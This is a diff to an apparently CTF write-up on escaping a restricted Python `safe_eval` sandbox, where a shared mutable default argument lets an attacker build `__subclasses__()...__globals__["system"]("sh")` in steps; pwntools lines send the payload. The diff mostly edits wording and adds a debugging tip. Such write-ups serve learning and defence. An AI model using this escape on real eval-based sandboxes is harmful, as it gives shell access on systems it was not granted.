@@ -50,7 +50,7 @@ for _ in range(10):
 Requirements:
 
 1. No `'`: Use `"` for strings
-2. Some characters may appear only once: save intermediate values to locals
+2. Some characters may appear only once: Save intermediate values to locals
 3. No builtins: Use `().__class__.__base__.__subclasses__()` to bypass
 
 The major problem here, is that the default argument `loc={}` is shared between calls. So the locals array is only one and shared between calls to `safe_eval`. So we can simply cut the attack `().__class__.__base__.__subclasses__()[158].__init__.__globals__["system"]["sh"]` into multiple steps:
@@ -94,5 +94,7 @@ p.sendline(f'[O.__globals__["system"]("sh")]'.encode())
 
 p.interactive()
 ```
+
+Debugging tips: change `safe_eval(command)` to `print(safe_eval(command))` for debugging lovally.
 
 References: [TBTL CTF 2024 (Pwn)](https://ssongkit.tistory.com/808).
